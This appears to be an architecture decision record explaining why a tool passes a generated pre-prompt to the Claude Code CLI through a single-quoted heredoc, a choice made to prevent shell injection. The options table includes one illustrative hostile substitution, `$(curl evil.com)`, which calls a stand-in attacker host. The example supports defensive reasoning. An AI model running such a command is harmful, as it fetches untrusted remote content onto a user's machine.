---
id: ADR-003
title: Pre-prompt delivery — quoted HERE-DOC into `claude`'s positional argument
status: accepted
date: 2026-05-25
deciders: [iain]
---

## Context

The change-as-primitive design (§ "Session binding", step 5) specifies that the spawned terminal invokes `claude` with a HERE-DOC pre-prompt briefing the agent on the change. The pre-prompt body is free-form Markdown produced by `sulis-change start` (per WP-004) and varies per spawn.

Three concerns shape the decision:

1. **Shell-injection safety.** The pre-prompt body is generated text. Even though it is produced from validated change metadata (no untrusted free-form user input today), the delivery mechanism must not allow a future regression that lets prompt content escape and execute as shell.
2. **Cross-platform.** macOS Terminal, gnome-terminal, konsole, xterm, and the headless subprocess fallback all execute the same bash launch script. The delivery mechanism must work identically across all five.
3. **Claude CLI contract.** `claude` (Claude Code's CLI) accepts a positional argument as the first user prompt. There is no documented `--prompt` flag; the documented usage is `claude "first prompt"`.

We need to choose how the bash script delivers the pre-prompt string to `claude`.

## Decision

Deliver the pre-prompt as the first positional argument to `claude`, supplied via a **quoted HERE-DOC** captured by command substitution:

```bash
exec {entry_command} "$(cat <<'SULIS_PROMPT_EOF'
{pre_prompt body inlined verbatim}
SULIS_PROMPT_EOF
)"
```

Key properties:

- The heredoc tag is **single-quoted** (`<<'SULIS_PROMPT_EOF'`). Bash disables parameter expansion and command substitution inside the heredoc body. `$HOME`, `${USER}`, backticks, `$(...)` inside the pre-prompt pass through verbatim — they are never re-interpreted by the shell.
- The whole substitution is **double-quoted** at the call site (`"$(...)"`). This preserves the captured string as a single argv element, including newlines.
- The pre-prompt body is validated before script generation: rejected if it contains the literal heredoc tag `SULIS_PROMPT_EOF` (would close the heredoc early) or exceeds 50_000 bytes (pathological-input guard). See `_validate_pre_prompt` in WP-006.

## Options Considered

| Option | Mechanism | Outcome |
|---|---|---|
| **Quoted HERE-DOC into positional argv (chosen)** | `exec claude "$(cat <<'EOF' ... EOF)"` | Multiline OK; no expansion inside body; single positional arg; matches `claude`'s documented invocation shape. |
| Inline string literal | `exec claude "Long prompt body with newlines and ${VARS}..."` | Newlines and metacharacters in the prompt body would need bash escaping at script-generation time — fragile, easy to break, no protection from future expansion regressions. Rejected. |
| `--prompt` flag | `exec claude --prompt "..."` | `claude` does not document a `--prompt` flag. Relying on undocumented flags is a future-fragility tax for no benefit. Rejected. |
| Temp file + path argument | Write prompt to `/tmp/xxx.md`; `exec claude < /tmp/xxx.md` or `exec claude "$(cat /tmp/xxx.md)"` | Adds a tempfile + cleanup concern and an inode that may outlive the session. Same parameter-expansion problem if not heredoc-quoted on read. Rejected. |
| Pipe via stdin | `cat <<EOF | claude ...` | `claude`'s stdin handling is for interactive turns, not initial-prompt injection. Behaviour not documented for this case; would likely produce a confused session. Rejected. |
| Unquoted HERE-DOC tag | `exec claude "$(cat <<SULIS_PROMPT_EOF ... SULIS_PROMPT_EOF)"` | Bash performs parameter expansion and command substitution inside the body. `$HOME` becomes `/Users/iain`; backticks would run; `$(curl evil.com)` would fire. Rejected — defeats the entire purpose of having a generated-string delivery mechanism. |

The quoted-heredoc-into-positional-argv option is the only one that simultaneously:
- Preserves multiline content without escaping
- Disables shell interpretation of the body
- Matches `claude`'s documented invocation contract
- Requires no temp files or stdin gymnastics

## Consequences

- **Positive:** The pre-prompt body is delivered to `claude` byte-for-byte (modulo the body's own UTF-8 encoding). Bash never sees the content as shell syntax. The mechanism is identical across macOS, Linux, and headless dispatch paths because all three execute the same generated bash script.
- **Positive:** The mechanism extends cleanly: any future caller that wants to brief a spawned Claude session can pass `pre_prompt=...` into `launch_change_terminal`; no per-call escape logic in callers.
- **Negative:** The validator must continue to enforce the no-`SULIS_PROMPT_EOF`-in-body rule. If `claude`'s positional-argument contract changes (e.g. a future Claude Code release switches to require `--prompt`), this ADR is revisited.
- **Negative:** A fixed heredoc tag means there is a single string that callers must never include in the prompt body. The validator catches this; the cost is one test and one constant.
- **Neutral:** Future enhancement (dynamic per-spawn tag like `SULIS_PROMPT_{change_id}_EOF`) is open if signal warrants. The current fixed tag plus validator is the minimum-viable safe choice — belt without braces, justified by the validator's coverage.
